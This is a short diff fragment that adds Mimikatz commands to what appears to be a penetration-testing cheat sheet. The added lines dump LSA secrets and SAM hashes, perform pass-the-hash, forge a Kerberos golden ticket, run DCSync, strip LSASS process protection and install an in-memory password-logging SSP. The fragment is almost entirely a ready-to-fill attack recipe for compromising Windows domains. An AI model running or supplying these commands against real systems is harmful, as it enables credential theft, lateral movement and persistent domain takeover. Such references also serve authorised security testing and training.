@@ -67,8 +67,19 @@ reset session 1
 
 privilege::debug
 token::elevate
+lsadump::secrets
 lsadump::sam
+lsadump::lsa
 sekurlsa::logonpasswords
+
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlmhash>
+kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<krbtgt hash> /endin:<value> /renewmax:<value>
+lsadump::dcsync /domain:<domain> /user:<user>
+
+!+
+!processprotect /process:lsass.exe /remove
+
+misc::memssp
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
